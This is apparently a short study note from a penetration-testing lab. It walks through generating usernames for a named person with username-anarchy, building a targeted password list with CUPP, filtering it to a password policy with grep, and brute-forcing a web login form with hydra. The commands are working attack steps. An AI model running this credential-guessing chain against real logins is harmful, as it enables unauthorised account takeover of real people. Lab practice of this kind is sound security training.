


(Ruby) Username list generator
```shell-session
git clone https://github.com/urbanadventurer/username-anarchy.git
```

```shell-session
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

Password list generator
```shell-session
sudo apt install cupp -y
```

Interactive mode
```shell-session
cupp -i
```



Filtering
```shell-session
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```
![[Pasted image 20241016195900.png]]

Apply user list and password list
```shell-session
hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```